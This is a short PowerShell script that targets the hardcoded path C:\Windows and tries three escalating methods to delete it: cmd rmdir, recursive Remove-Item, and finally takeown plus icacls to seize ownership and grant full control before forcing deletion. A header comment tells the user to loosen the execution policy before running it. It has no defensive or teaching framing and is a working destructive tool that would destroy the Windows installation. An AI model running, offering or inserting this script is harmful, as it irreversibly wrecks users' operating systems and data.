# use in PS: Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

$p = "C:\Windows"

# 1: Direct CMD deletion (fastest)
if (Test-Path $p) {
    cmd /c "rmdir /s /q `"$p`" 2>nul"
    if (-not (Test-Path $p)) { Write-Host "Deleted: $p" -f Green; exit }
}

#  2: PowerShell with parallel processing
if (Test-Path $p) {
    try {
        Get-ChildItem $p -Force -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        Remove-Item $p -Force -ErrorAction Stop
        Write-Host "Deleted: $p" -f Green
    } catch {
        #  3: Takeown + Cacls (for stubborn files)
        takeown /f "$p" /r /d y >$null 2>&1
        icacls "$p" /grant administrators:F /t >$null 2>&1
        cmd /c "rmdir /s /q `"$p`" 2>nul"
        if (-not (Test-Path $p)) { Write-Host "Force deleted: $p" -f Green }
        else { Write-Host "Failed to delete: $p" -f Red }
    }
} else {
    Write-Host "Not found: $p" -f Yellow
}
